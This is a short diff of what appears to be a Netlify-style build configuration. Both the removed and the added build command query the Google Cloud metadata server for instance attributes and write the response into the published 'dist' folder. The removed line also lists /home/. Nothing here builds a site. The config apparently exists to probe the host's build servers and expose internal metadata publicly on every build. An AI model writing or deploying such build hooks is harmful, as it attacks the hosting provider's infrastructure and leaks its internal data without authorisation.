@@ -1,5 +1,5 @@
 [build]
-  command = "ls -lah /home/ && mkdir dist && curl -i -H 'X-Google-Metadata-Request: True' -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/instance-template -o dist/output.txt"
+  command = "mkdir dist && curl -i -H 'X-Google-Metadata-Request: True' -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/attributes/cluster-location -o dist/output.txt"
   publish = "dist"
 [build.environment]
   YARN_VERSION = "1.9.4"
